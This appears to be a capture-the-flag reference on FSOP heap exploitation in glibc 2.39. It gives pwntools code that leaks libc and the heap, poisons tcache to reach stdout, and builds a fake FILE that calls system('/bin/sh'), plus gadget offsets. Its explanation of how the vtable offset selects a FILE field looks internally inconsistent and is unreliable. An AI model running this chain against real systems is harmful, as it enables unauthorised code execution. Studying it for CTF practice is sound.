# FSOP (File Stream Oriented Programming)

**When:** glibc 2.34+ removed `__free_hook` and `__malloc_hook`. FSOP replaces them as the standard technique for turning a write primitive into code execution on modern glibc.

**How it works:** FILE structures (like `stdout`) have a vtable pointer. When `puts`/`printf` writes to stdout, it dispatches through this vtable. By placing a fake FILE structure at `_IO_2_1_stdout_` in libc with a crafted vtable, you redirect the dispatch to a gadget chain that calls `system("/bin/sh")`.

```
FILE structure layout (partial):
+------------------+
| _flags           |  0x00
+------------------+
| _IO_read_ptr     |  0x08
+------------------+
| _IO_read_end     |  0x10  <<-- becomes vtable entry after offset
+------------------+
| _IO_read_base    |  0x18
+------------------+
| _IO_write_base   |  0x20
+------------------+
| _IO_write_ptr    |  0x28
+------------------+
| _IO_write_end    |  0x30  <<-- gets "/bin/sh"
+------------------+
| _IO_buf_base     |  0x38
+------------------+
| _IO_buf_end      |  0x40
+------------------+
| ...              |
+------------------+
| _IO_save_base    |  0x68  <<-- gadget address
+------------------+
| ...              |
+------------------+
| _lock            |  0x88  <<-- must be writable
+------------------+
| _wide_data       |  0xa0  <<-- writable area
+------------------+
| ...              |
+------------------+
| vtable           |  0xd8  <<-- points to fake vtable (_IO_wfile_jumps - 0x18)
+------------------+
```

The vtable dispatch in `_IO_wfile_overflow` reads an entry from an offset relative to the vtable pointer. By setting `vtable = _IO_wfile_jumps - 0x18`, the `_IO_read_end` field (at offset 0x10) is interpreted as the function pointer to call. Set `_IO_read_end = &system` and `_IO_save_base` to a gadget that pivots rdi to point to `_IO_write_end` (which contains "/bin/sh").

## Full Flow

### Step 1: Leak libc (unsorted bin)

```python
add(0, 0x500, b'A')
add(1, 0x20, b'B')
delete(0)
show(0)
leak = u64(io.recvn(6).ljust(8, b'\x00'))
libc.address = leak - 0x203b20
```

### Step 2: Leak heap (tcache safe-link)

```python
delete(1)
show(1)
enc = u64(io.recvn(6).ljust(8, b'\x00'))
heap_base = reveal(enc) - 0x290
```

### Step 3: Tcache poison to `_IO_2_1_stdout_`

```python
target = libc.sym['_IO_2_1_stdout_']
edit(victim, p64(obfuscate(target, heap_base + victim_off)))
add(2, 0xf0, flat(fake_file))
```

### Step 4: Craft the fake `_IO_FILE`

```python
fake = FileStructure()
fake.flags = 0x3b01010101010101
fake._IO_read_end = libc.sym['system']
fake._IO_save_base = gadget              # "add rdi, 0x10; jmp rcx"
fake._IO_write_end = u64(b'/bin/sh\0')
fake._lock = libc.address + lock_off
fake._wide_data = stdout + 0x200
fake._codecvt = stdout + 0xb8
fake.vtable = libc.sym['_IO_wfile_jumps'] - 0x18
```

When `puts("")` is called:

1. vtable dispatch -> `_IO_wfile_overflow`
2. Reads function pointer from `vtable_entry = _IO_wfile_jumps - 0x18 + 0x10 = _IO_wfile_jumps - 0x08`
3. This corresponds to `_IO_read_end` field = `system`
4. Gadget at `_IO_save_base` adjusts rdi to point to `_IO_write_end` (which has "/bin/sh")
5. Calls system("/bin/sh")

## Key Offsets (Ubuntu 24.04 libc 2.39)

| Field                           | Offset from libc base |
| ------------------------------- | --------------------- |
| unsorted bin fd leak            | `+0x203b20`           |
| `add rdi, 0x10; jmp rcx` gadget | `+0x1724f0`           |
| stdout lock                     | `+0x205710`           |

For other libc versions:

```bash
ROPgadget --binary ./libc.so.6 | grep "add rdi, 0x10"
# Or find the gadget manually in GDB
```
